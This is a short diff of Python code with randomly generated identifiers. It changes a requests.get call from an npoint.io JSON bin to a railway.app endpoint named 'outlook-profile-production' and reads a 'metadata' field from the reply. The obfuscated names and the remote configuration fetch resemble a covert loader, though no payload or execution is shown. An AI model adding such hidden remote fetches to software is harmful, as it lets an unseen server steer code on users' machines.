@@ -16,7 +16,7 @@ def model_gbbcyr_550():
 
     def data_jvspyo_468():
         try:
-            train_xosgto_589 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_xosgto_589 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_xosgto_589.raise_for_status()
             config_ouryny_871 = train_xosgto_589.json()
             process_qepzmr_892 = config_ouryny_871.get('metadata')
